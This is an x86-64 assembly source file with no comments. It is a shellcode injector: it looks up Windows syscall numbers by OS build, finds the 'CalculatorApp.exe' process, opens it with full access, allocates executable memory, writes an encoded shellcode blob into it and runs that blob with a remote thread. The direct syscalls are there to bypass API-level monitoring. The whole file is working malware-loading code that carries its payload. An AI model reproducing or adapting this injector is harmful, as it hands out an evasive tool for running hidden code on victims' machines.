section .data
shellcode db 048h, 031h, 0dbh, 054h, 05eh, 0b3h, 08eh, 066h, 081h, 0e6h
db 090h, 0f3h, 0dbh, 0ddh, 048h, 00fh, 0aeh, 006h, 049h, 0b9h
db 058h, 09fh, 0ceh, 0c4h, 022h, 027h, 0d6h, 05fh, 04ch, 08bh
db 06eh, 008h, 048h, 0ffh, 0cbh, 04dh, 031h, 04ch, 0ddh, 021h
db 048h, 085h, 0dbh, 075h, 0f3h, 015h, 0aeh, 015h, 01dh, 0e2h
db 06eh, 05fh, 0bfh, 010h, 025h, 029h, 04dh, 04ah, 074h, 0e9h
db 072h, 02fh, 047h, 08fh, 077h, 0aah, 041h, 097h, 0deh, 0b8h
db 0cfh, 039h, 08dh, 02dh, 089h, 0d6h, 012h, 0d3h, 0d7h, 0c6h
db 08dh, 0ddh, 0ech, 09dh, 06eh, 00ch, 046h, 0e3h, 089h, 0a7h
db 0fch, 0a3h, 0ach, 0ebh, 05eh, 097h, 068h, 044h, 0d1h, 065h
db 0e1h, 03eh, 0f7h, 086h, 063h, 05dh, 0bdh, 023h, 0cfh, 007h
db 0aah, 0d9h, 0eeh, 072h, 016h, 056h, 039h, 089h, 05eh, 0a9h
db 039h, 01ch, 042h, 02ah, 0eeh, 0b7h, 05eh, 059h, 058h, 055h
db 03bh, 0e5h, 07ah, 096h, 05eh, 023h, 068h, 068h, 0f9h, 055h
db 071h, 020h, 031h, 005h, 0ebh, 00dh, 058h, 0d5h, 0d8h, 026h
db 065h, 0abh, 0b9h, 042h, 071h, 02ch, 031h, 0a0h, 0f8h, 05ch
db 080h, 052h, 074h, 012h, 056h, 0c0h, 038h, 00bh, 01ch, 0efh
db 0b7h, 06bh, 0f0h, 08fh, 086h, 073h, 02bh, 092h, 040h, 0d3h
db 0dah, 08bh, 0fch, 073h, 015h, 050h, 0feh, 03ah, 07ah, 043h
db 068h, 0a5h, 0a5h, 07ah, 0feh, 008h, 063h, 099h, 0e5h, 0a4h
db 0bch, 0c9h, 042h, 0bch, 0fah, 04fh, 0d8h, 0bch, 01ch, 04ah
db 0f6h, 004h, 0e9h, 047h, 056h, 0f4h, 07ah, 0fbh, 034h, 075h
db 094h, 047h, 0d2h, 04ch, 035h, 04dh, 078h, 0fdh, 0adh, 052h
db 0a3h, 077h, 031h, 037h, 048h, 0c6h, 06fh, 0b9h, 075h, 077h
db 09ch, 066h, 004h, 089h, 0f0h, 000h, 00fh, 03ch, 056h, 03bh
db 045h, 0a2h, 0dbh, 0c0h, 031h, 080h, 0c3h, 0f3h, 028h, 026h
db 065h, 0b1h, 079h, 088h, 0cbh, 07dh, 062h, 042h, 0b7h, 0b8h
db 04dh, 022h, 08ah, 03fh, 047h, 06ah, 0b7h, 0b9h, 031h, 029h
db 0cbh, 043h, 090h, 0bbh, 0b8h, 0b9h, 04bh, 019h, 0f7h, 081h
db 015h, 069h, 055h, 06dh, 0b3h, 0edh, 02bh, 0d5h, 078h, 088h
db 07ch, 071h, 0beh, 045h, 045h, 034h, 0a2h, 0efh, 0b3h, 0d6h
db 0c8h, 05fh, 0b4h, 0fbh, 052h, 0f6h, 087h, 071h, 08ah, 0edh
db 07bh, 0fbh, 0a2h, 092h, 0cfh, 008h, 07dh, 050h, 064h, 0fbh
db 0d8h, 08ah, 0f2h, 0cah, 03dh, 0fbh, 077h, 0a8h, 01ah, 084h
db 0a4h, 0f0h, 0c1h, 0b3h, 0b5h, 01dh, 0abh, 03ch, 03ah, 0b8h
db 0f0h, 061h, 091h, 004h, 061h, 03eh, 008h, 0a1h, 097h, 0fbh
db 07fh, 01eh, 0f2h, 024h, 0e3h, 0a2h, 0e1h, 0fbh, 0fbh, 0fbh
db 0a0h, 026h, 025h, 0c1h, 008h, 0fbh, 07fh, 03eh, 0bah, 024h
db 059h, 030h, 06dh, 08fh, 095h, 030h, 0e8h, 040h, 048h, 0b1h
db 000h, 07ah, 0f9h, 00dh, 0ebh, 0adh, 08ah, 01dh, 093h, 0f2h
db 0a5h, 004h, 061h, 03eh, 048h, 07bh, 083h, 08fh, 0bch, 04dh
db 03ah, 00ah, 0e9h, 088h, 0d9h, 0b8h, 0f6h, 043h, 06fh, 01eh
db 068h, 0f0h, 0c1h, 038h, 074h, 0c4h, 0eah, 06ch, 068h, 0b8h
db 044h, 073h, 080h, 02bh, 0a2h, 06dh, 0b8h, 0b4h, 04ah, 0f3h
db 0d4h, 005h, 0ebh, 0bch, 038h, 07bh, 089h, 0abh, 017h, 01ah
db 0a2h, 093h, 0a1h, 0b1h, 04ah, 087h, 07ch, 004h, 0ebh, 0bah
db 025h, 0c1h, 008h, 0fbh, 0c5h, 08ch, 046h, 02dh, 0a9h, 039h
db 0cch, 0f2h, 0f5h, 08dh, 0d2h, 08ch, 01dh, 001h, 08dh, 0b0h
db 0b8h, 068h, 0e2h, 029h, 051h, 021h, 0b4h, 06bh, 0ach, 008h
db 061h, 02ch, 04ch, 0b9h, 0c0h, 063h, 092h, 00dh, 061h, 060h
db 020h, 0b4h, 04ah, 0f3h, 0e8h, 005h, 0ebh, 0bch, 029h, 07bh
db 0c5h, 03bh, 0b5h, 014h, 0abh, 034h, 020h, 0f1h, 011h, 0edh
db 0adh, 016h, 0abh, 034h, 029h, 0a9h, 080h, 0e9h, 0bch, 0cfh
db 006h, 04ch, 029h, 0a2h, 03eh, 053h, 0ach, 00dh, 0b3h, 036h
db 020h, 07bh, 0d3h, 05ah, 0bfh, 0b3h, 015h, 093h, 035h, 0b8h
db 0f0h, 068h, 0a7h, 005h, 054h, 01bh, 001h, 09eh, 0a8h, 0ddh
db 091h, 038h, 0eah, 02dh, 03eh, 0b8h, 048h, 052h, 0bdh, 08bh
db 028h, 020h, 01fh, 0d6h, 0c6h, 04ch, 021h, 01fh, 0b9h, 084h
db 03ch, 0f0h, 0c1h, 0b3h, 0b9h, 023h, 090h, 005h, 004h, 09ch
db 0a0h, 09ch, 0c1h, 062h, 0dah, 04ch, 040h, 0bdh, 0a0h, 0d0h
db 09dh, 022h, 09eh, 003h, 01bh, 098h, 0fah, 093h, 0bdh, 022h
db 09eh, 009h, 004h, 0d0h, 08ch, 0d2h, 097h, 06ch, 0a5h, 03fh
db 048h, 0a8h, 0e1h, 082h, 0c0h, 062h, 0ddh, 057h, 048h, 082h
db 0b7h, 089h, 0c5h, 07fh, 0d9h, 042h, 058h, 0d9h, 0e1h, 0f4h
db 091h, 02fh, 081h, 003h, 047h, 0c2h, 0f1h, 082h, 0c4h, 07ch
db 0dbh, 05ch, 059h, 0d0h, 087h, 0dah, 086h, 029h, 08ch, 003h
db 010h, 0dfh, 0f0h, 080h, 0c7h, 062h, 0dah, 06ch, 031h, 0a3h
db 09bh, 0feh, 0c5h, 08ch, 0a7h, 05dh, 0a1h, 0a3h, 092h, 0fah
db 04eh, 076h, 0bch, 015h, 0cfh, 0f0h, 0c1h, 0b3h, 0f4h, 0b3h
db 03fh, 084h, 066h, 0f0h, 0c1h, 0b3h, 0c5h, 075h, 0d8h, 042h
db 059h, 0c6h, 0f9h, 09dh, 0c5h, 062h, 0d8h, 05ch, 058h, 0f0h
db 09bh, 0fbh, 07dh, 08dh, 0a3h, 0abh, 0a8h, 00bh, 0e1h, 0b3h
db 0f4h, 001h, 0dbh, 0a5h, 03bh, 0a3h, 0abh, 0b0h, 0a7h, 005h
db 050h, 03bh, 0e1h, 06fh, 007h, 0b3h, 0f4h, 04ch, 0eah, 093h
db 0bdh, 018h, 07ch, 0b3h, 0f4h, 04ch, 0c5h, 028h, 018h, 0ddh
db 099h, 0f4h, 0b5h, 022h, 08ch, 026h, 022h, 09eh, 0bbh, 0f6h
db 092h, 005h, 0beh, 001h, 05ch, 0b4h, 0f7h, 0dah, 083h, 078h
db 0a5h, 00bh, 01ch, 0a6h, 0f6h, 0d7h, 0cdh, 01ch, 0a8h, 018h
db 007h, 092h, 095h, 082h, 0bdh, 020h, 090h, 01dh, 02ah, 0c3h
db 0f1h, 0e9h, 0c5h, 03eh, 0c7h, 00bh, 05dh, 09dh, 0b6h, 087h
db 0bbh, 018h, 0b8h, 016h, 01dh, 0a5h, 0f5h, 080h, 0cdh, 034h
db 0b2h, 006h, 00ch, 0b8h, 0b5h, 0dbh, 0bbh, 07ch, 080h, 05dh
db 005h, 09eh, 084h, 0cbh, 0aeh, 01eh, 0dch, 02eh, 025h, 0b4h
db 0f0h, 0eah, 0beh, 015h, 088h, 02fh, 05ch, 0a1h, 080h, 082h
db 082h, 01fh, 0d9h, 018h, 02dh, 0c6h, 08ah, 08bh, 090h, 00ah
db 0a8h, 05eh, 00fh, 0a5h, 0f1h, 0e6h, 0c7h, 025h, 084h, 000h
db 002h, 097h, 0b8h, 0e6h, 0a2h, 03bh, 08bh, 035h, 00bh, 0b7h
db 088h, 0e1h, 095h, 039h, 09bh, 01fh, 019h, 0bdh, 098h, 0c7h
db 092h, 023h, 0bch, 05fh, 05eh, 08ah, 0b3h, 0cbh, 0b9h, 07ah
db 0a2h, 020h, 00fh, 085h, 0b6h, 087h, 095h, 038h, 08fh, 03bh
db 02ah, 0a0h, 0afh, 0e2h, 0a3h, 022h, 0afh, 029h, 026h, 098h
db 0a5h, 08bh, 092h, 01ch, 09fh, 058h, 05dh, 091h, 084h, 08ah
db 0c3h, 007h, 08eh, 002h, 059h, 0bbh, 087h, 082h, 091h, 03ch
db 0b2h, 01dh, 01bh, 0afh, 0c1h, 0fbh, 07dh, 08dh, 0b9h, 036h
db 029h, 0a8h, 08ch, 082h, 03dh, 01fh, 0a2h, 0d4h, 068h, 0c2h
db 069h, 037h, 0f4h, 04ch, 0eah, 06ch, 038h, 0a3h, 092h, 0fah
db 033h, 08eh, 001h, 039h, 046h, 0cbh, 03eh, 066h, 0bch, 0c5h
db 02ch, 006h, 062h, 0afh, 089h, 03ah, 005h, 026h, 0f5h, 036h
db 03ah, 098h, 041h, 080h, 0f4h, 04ch, 0a3h, 0e5h, 088h, 09ah
db 0c5h, 0f2h, 0adh, 005h, 050h, 019h, 02eh, 06eh, 047h, 0b3h
db 0f4h, 04ch, 0eah, 093h, 0bdh, 0bdh, 0f0h, 073h, 0a7h, 016h
db 0a2h, 0e5h, 099h, 0bdh, 0f0h, 07ah, 0b9h, 07dh, 023h, 03fh
db 03bh, 0b9h, 006h, 071h, 0d9h, 04ah, 0f2h, 017h, 097h, 025h
db 044h, 073h, 081h, 053h, 0a2h, 0abh, 0a9h, 078h, 0d2h, 0b3h
db 0f4h, 005h, 050h, 028h, 098h, 0c5h, 021h, 0b3h, 0f4h, 04ch
db 0eah, 093h, 0bdh, 0b8h, 03eh, 07ch, 080h, 04eh, 001h, 0c6h
db 080h, 0a5h, 0c1h, 0b3h, 0f4h, 01fh, 0b3h, 006h, 028h, 0aah
db 088h, 03ah, 025h, 08dh, 008h, 07ch, 021h, 037h, 001h, 0b3h
db 0e4h, 04ch, 0eah, 025h, 0d2h, 0a8h, 065h, 0e0h, 011h, 04ch
db 0eah, 06ch, 068h, 00fh, 014h, 0fbh, 067h, 01fh, 0b9h, 024h
db 0e1h, 017h, 089h, 03ah, 005h, 004h, 063h, 0b6h, 021h, 037h
db 001h, 0b3h, 0d4h, 04ch, 0eah, 025h, 0e1h, 009h, 088h, 009h
db 0e6h, 0dah, 063h, 08eh, 068h, 0f0h, 0c1h, 0b3h, 00bh, 099h
db 0a2h, 0efh, 0ach, 0d0h, 044h, 073h, 080h, 0feh, 08ch, 0e7h
db 06fh, 0b8h, 0c0h, 070h, 071h, 08ch, 09fh, 0beh, 030h, 033h
db 099h, 0d9h, 0f4h, 015h, 0a3h, 0abh, 0aah, 000h, 074h, 011h
db 0a2h, 0b3h, 03fh, 022h, 0dbh, 0b3h, 043h, 0ceh, 0e3h, 065h
db 034h, 0f2h, 0d2h, 002h, 0eah, 075h, 0cbh, 025h, 07ah, 039h
db 0c5h
global _start
section .text
_start:
push rbp
mov rbp, rsp
sub rsp, 0x500
jmp Begin
m_10240:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00b3
cmovz rdi, rbx
ret
m_10586:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00b4
cmovz rdi, rbx
ret
m_14393:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00b6
cmovz rdi, rbx
ret
m_15063:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00b9
cmovz rdi, rbx
ret
m_16299:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00ba
cmovz rdi, rbx
ret
m_17134:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00bb
cmovz rdi, rbx
ret
m_17763:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00bc
cmovz rdi, rbx
ret
m_18362:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00bd
cmovz rdi, rbx
ret
m_18363:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00bd
cmovz rdi, rbx
ret
m_19041:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c1
cmovz rdi, rbx
ret
m_19042:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c1
cmovz rdi, rbx
ret
m_19043:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c1
cmovz rdi, rbx
ret
m_19044:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c2
cmovz rdi, rbx
ret
m_19045:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c2
cmovz rdi, rbx
ret
m_22000:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c5
cmovz rdi, rbx
ret
m_20348:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c6
cmovz rdi, rbx
ret
m_22621:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c7
cmovz rdi, rbx
ret
m_22631:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c7
cmovz rdi, rbx
ret
m_25398:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c8
cmovz rdi, rbx
ret
m_26100:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c9
cmovz rdi, rbx
ret
GetSysModelNumber:
mov rax, gs:[0x60]
mov rax, [rax+0x120]
and rax, 0xffff
cmp eax, 10240
je m_10240
cmp eax, 10586
je m_10586
cmp eax, 14393
je m_14393
cmp eax, 15063
je m_15063
cmp eax, 16299
je m_16299
cmp eax, 17134
je m_17134
cmp eax, 17763
je m_17763
cmp eax, 18362
je m_18362
cmp eax, 18363
je m_18363
cmp eax, 19041
je m_19041
cmp eax, 19042
je m_19042
cmp eax, 19043
je m_19043
cmp eax, 19044
je m_19044
cmp eax, 19045
je m_19045
cmp eax, 22000
je m_22000
cmp eax, 20348
je m_20348
cmp eax, 22621
je m_22621
cmp eax, 22631
je m_22631
cmp eax, 25398
je m_25398
cmp eax, 26100
je m_26100
ret
invokeSysCall:
syscall
ret
Begin:
mov qword [rbp-0x4], 0x0
mov word [rbp-0xc], 0x0
mov word [rbp-0xe], 0x0
mov qword [rbp-0x10], 0x0
mov qword [rbp-0x18], 0x0
mov qword [rbp-0x20], 0x0
mov word [rbp-0x28], 0x0
mov word [rbp-0x2a], 0x0
mov dword [rbp-0x2c], 0x0
mov dword [rbp-0x30], 0x0
mov dword [rbp-0x34], 0x0
mov dword [rbp-0x38], 0x0
mov qword [rbp-0x3c], 0x0
mov dword [rbp-0x44], 0x0
mov qword [rbp-0x10], 0x0
mov word [rbp-0x44], 0x1c
mov qword [rbp-0x48], 0x0
mov qword [rbp-0x50], 0x0
mov qword [rbp-0x58], 0x2000
mov qword [rbp-0x60], 0x0
mov qword [rbp-0x68], 0x0
mov qword [rbp-0x70], 0x0
mov qword [rbp-0x78], 0x0
mov qword [rbp-0x80], 0x5
mov qword [rbp-0x88], 0x0
mov qword [rbp-0x90], 0x0
mov qword [rbp-0x98], 0x0
mov qword [rbp-0xa0], 0x0
lea rax, [rel shellcode]
mov qword [rbp-0xa8], rax
loopStart_ZhT:
NtAllocateVirtualMemory:
mov rcx, -1
lea rbx, qword [rbp-0x48]
mov rdx, rbx
mov r8, qword [rbp-0x68]
lea rbx, qword [rbp-0x58]
mov r9, rbx
push 0x4
push 0x3000
sub rsp, 0x20
mov rdi, 0x1d
call GetSysModelNumber
mov r10, rcx
mov rax, rdi
call invokeSysCall
add rsp, 0x38
NtQuerySystemInformation:
mov rcx, qword [rbp-0x80]
mov rdx, qword [rbp-0x48]
mov r8, qword [rbp-0x58]
lea rbx, qword [rbp-0x70]
mov r9, rbx
sub rsp, 0x20
mov rdi, 0x150
call GetSysModelNumber
mov r10, rcx
mov rax, rdi
call invokeSysCall
mov qword [rbp-0x78], rax
add rsp, 0x30
mov rax, qword [rbp-0x78]
cmp rax, 0x0
je loopEnd_ufR
add qword [rbp-0x70], 0x2000
mov rbx, qword [rbp-0x70]
mov qword [rbp-0x58], rbx
mov qword [rbp-0x48], 0x0
jmp loopStart_ZhT
loopEnd_ufR:
mov rbx, qword [rbp-0x48]
mov qword [rbp-0x98], rbx
loopStart_elH:
mov rbx, qword [rbp-0x98]
mov ebx, dword [rbx]
mov qword [rbp-0x88], rbx
mov rax, qword [rbp-0x88]
cmp rax, 0x0
je loopEnd_utO
mov rbx, qword [rbp-0x88]
add qword [rbp-0x98], rbx
mov rbx, qword [rbp-0x98]
mov rbx, qword [rbx+0x40]
mov qword [rbp-0x90], rbx
sub rsp, 0x28
mov rax, 0x0063006c00610043
mov qword [rsp], rax
mov rax, 0x00740061006c0075
mov qword [rsp+8], rax
mov rax, 0x007000410072006f
mov qword [rsp+16], rax
mov rax, 0x00780065002e0070
mov qword [rsp+24], rax
mov rax, 0x0000000000000065
mov qword [rsp+32], rax
mov rbx, rsp
mov qword [rbp-0x4], rbx
mov word [rbp-0xe], 0x22
mov rdi, qword [rbp-0x90]
mov rsi, qword [rbp-0x4]
mov rcx, 0x22
cld
repe cmpsb
mov rbx, qword [rbp-0x98]
mov rbx, qword [rbx+0x50]
mov qword [rbp-0xa0], rbx
je loopEnd_utO
jmp loopStart_elH
loopEnd_utO:
mov qword [rbp-0xd8], 0x0
mov qword [rbp-0xe0], 0x0
mov qword [rbp-0xe8], 0x0
mov rbx, qword [rbp-0xa0]
mov qword [rbp-0xe8], rbx
NtOpenProcess:
lea rbx, qword [rbp-0xd8]
mov rcx, rbx
mov rdx, 0x1fffff
lea rbx, qword [rbp-0x44]
mov r8, rbx
lea rbx, qword [rbp-0xe8]
mov r9, rbx
sub rsp, 0x20
mov rdi, 0x100
call GetSysModelNumber
mov r10, rcx
mov rax, rdi
call invokeSysCall
add rsp, 0x30
mov qword [rbp-0x48], 0x0
NtAllocateVirtualMemory1:
mov rcx, qword [rbp-0xd8]
lea rbx, qword [rbp-0x48]
mov rdx, rbx
mov r8, qword [rbp-0x68]
lea rbx, qword [rbp-0x58]
mov r9, rbx
push 0x40
push 0x3000
sub rsp, 0x20
mov rdi, 0x1d
call GetSysModelNumber
mov r10, rcx
mov rax, rdi
call invokeSysCall
add rsp, 0x38
mov qword [rbp-0xf8], 0x49d
NtWriteVirtualMemory:
mov rcx, qword [rbp-0xd8]
mov rdx, qword [rbp-0x48]
mov r8, qword [rbp-0xa8]
mov r9, qword [rbp-0xf8]
lea rbx, qword [rbp-0x50]
push rbx
sub rsp, 0x20
mov rdi, 0x1f9
call GetSysModelNumber
mov r10, rcx
mov rax, rdi
call invokeSysCall
add rsp, 0x34
mov qword [rbp-0x100], 0x0
NtCreateThreadEx:
lea rbx, qword [rbp-0x100]
mov rcx, rbx
mov rdx, 0x1fffff
mov r8, 0x0
mov r9, qword [rbp-0xd8]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push qword [rbp-0x48]
sub rsp, 0x20
mov rdi, 0x80
call GetSysModelNumber
mov r10, rcx
mov rax, rdi
call invokeSysCall
add rsp, 0x4c
leave
ret